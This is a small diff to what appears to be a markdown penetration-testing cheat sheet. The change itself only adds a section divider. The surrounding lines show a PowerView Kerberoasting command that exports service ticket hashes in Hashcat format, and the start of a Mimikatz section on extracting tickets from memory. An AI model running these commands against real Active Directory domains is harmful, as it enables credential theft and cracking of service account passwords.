@@ -96,6 +96,8 @@ tr -d '[:space:]' < input_file > output_file
 ```powershell
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\domain_tgs.csv -NoTypeInformation
 ```
+---
+
 ### Extracting Tickets from Memory with Mimikatz
 ``` mimikatz
 mimikatz # base64 /out:true
